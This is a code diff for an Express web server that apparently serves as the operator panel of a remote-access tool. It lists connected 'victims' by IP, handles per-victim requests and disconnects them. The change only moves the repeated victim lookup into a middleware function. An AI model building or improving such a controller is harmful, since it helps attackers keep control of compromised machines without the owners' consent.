@@ -58,6 +58,20 @@ function waitForResponse(sock) {
 
 /******************* Web application server ********************/
 
+function checkVictim(req, res, next){
+    let i = 0, found = false, victim;
+
+    while (i < victims.length && !found){
+        if (victims[i].remoteAddress === req.params.ip){
+            victim = victims[i];
+            found = true;
+        }
+        i++;
+    }
+    req.victim = victim;
+    next();
+}
+
 app.get('/', function (req, res) {
     if (victims.length == 0){
         res.render('index.html');
@@ -68,16 +82,10 @@ app.get('/', function (req, res) {
     }
 })
 
-app.get('/:ip', function (req, res) {
-    let i = 0, found = false, end = false, victim;
-
-    while (i < victims.length && !found){
-        if (victims[i].remoteAddress === req.params.ip){
-            victim = victims[i];
-            found = false;
-        }
-        i++;
-    }
+app.get('/:ip', checkVictim, function (req, res) {
+    let end = false;
+    let victim = req.victim;
+    
     if (!victim){
         res.redirect(303, '/');
     }
@@ -100,16 +108,9 @@ app.get('/:ip', function (req, res) {
     }
 })
 
-app.post('/:ip', function (req, res) {
-    let i = 0, found = false, victim;
+app.post('/:ip', checkVictim, function (req, res) {
+    let victim = req.victim;
 
-    while (i < victims.length && !found){
-        if (victims[i].remoteAddress === req.params.ip){
-            victim = victims[i];
-            found = false;
-        }
-        i++;
-    }
     if (!victim){
         res.redirect(303, '/');
     }
@@ -124,16 +125,12 @@ app.post('/:ip', function (req, res) {
     }
 })
 
-app.post('/:ip/disconnect', function(req, res){
-    let i = 0, found = false;
+app.post('/:ip/disconnect', checkVictim, function(req, res){
+    let victim = req.victim;
 
-    while (i < victims.length && !found){
-        if (victims[i].remoteAddress === req.params.ip){
-            victims[i].destroy();
-            found = true;
-            console.log("%s Connection ended", date.format());
-        }
-        i++;
+    if (victim){
+        victim.destroy();
+        console.log("%s Connection ended", date.format());
     }
  
     res.redirect(303, '/');
